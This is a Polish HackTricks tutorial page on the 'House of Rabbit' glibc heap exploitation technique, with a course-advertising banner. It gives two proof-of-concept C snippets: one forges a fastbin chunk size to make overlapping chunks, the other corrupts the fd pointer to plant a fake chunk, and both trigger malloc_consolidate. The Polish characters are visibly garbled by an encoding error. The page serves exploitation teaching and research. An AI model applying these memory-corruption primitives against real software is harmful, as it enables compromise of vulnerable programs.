# Dom Kr贸lika

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakowania, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

### Wymagania

1. **Zdolno do modyfikacji wska藕nika fd lub rozmiaru fastbin**: Oznacza to, 偶e mo偶esz zmieni wska藕nik do przodu fragmentu w fastbin lub jego rozmiar.
2. **Zdolno do wywoania `malloc_consolidate`**: Mo偶na to zrobi poprzez przydzielenie du偶ego fragmentu lub scalenie fragmentu g贸rnego, co zmusza stert do konsolidacji fragment贸w.

### Cele

1. **Utworzenie nakadajcych si fragment贸w**: Aby jeden fragment nakada si na drugi, umo偶liwiajc dalsze manipulacje stert.
2. **Podrobienie faszywych fragment贸w**: Aby oszuka alokator, aby traktowa faszywy fragment jako prawidowy podczas operacji na stercie.

## Kroki ataku

### POC 1: Modyfikacja rozmiaru fragmentu fastbin

**Cel**: Utworzenie nakadajcego si fragmentu poprzez manipulacj rozmiarem fragmentu fastbin.

* **Krok 1: Alokacja fragment贸w**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
* **Krok 2: Zwolnij kawaki**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
* **Krok 3: Zmiana Rozmiaru Kawaka**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
* **Krok 4: Wywoaj `malloc_consolidate`**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
Przydzielanie du偶ej porcji powoduje wywoanie funkcji `malloc_consolidate`, czcej mae porcje w szybkim pojemniku. Zmanipulowany rozmiar `chunk1` powoduje nakadanie si na `chunk2`.

Po konsolidacji `chunk1` nakada si na `chunk2`, co umo偶liwia dalsze wykorzystanie.

### POC 2: Zmodyfikuj wska藕nik `fd`

**Cel**: Stw贸rz faszyw porcj, manipulujc wska藕nikiem `fd` w szybkim pojemniku.

* **Krok 1: Przydziel porcje**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**Wyjanienie**: Alokujemy dwa fragmenty, jeden mniejszy i jeden wikszy, aby przygotowa stert do faszywego fragmentu.

* **Krok 2: Utw贸rz faszywy fragment**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
* **Krok 3: Zwolnij `chunk1`**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**Wyjanienie**: Zwolniamy `chunk1`, dodajc go do listy fastbin.

* **Krok 4: Zmodyfikuj `fd` `chunk1`**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**Wyjanienie**: Zmieniamy wska藕nik w prz贸d (`fd`) `chunk1`, aby wskazywa na nasz faszywy kawaek wewntrz `chunk2`.

* **Krok 5: Wywoaj `malloc_consolidate`**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
### Podsumowanie

Technika **House of Rabbit** polega na zmodyfikowaniu rozmiaru fragmentu fast bin w celu stworzenia nakadajcych si fragment贸w lub manipulacji wska藕nikiem `fd` w celu stworzenia faszywych fragment贸w. Pozwala to atakujcym na tworzenie prawidowych fragment贸w na stercie, umo偶liwiajc r贸偶ne formy eksploatacji. Zrozumienie i praktykowanie tych krok贸w poprawi Twoje umiejtnoci eksploatacji sterty.
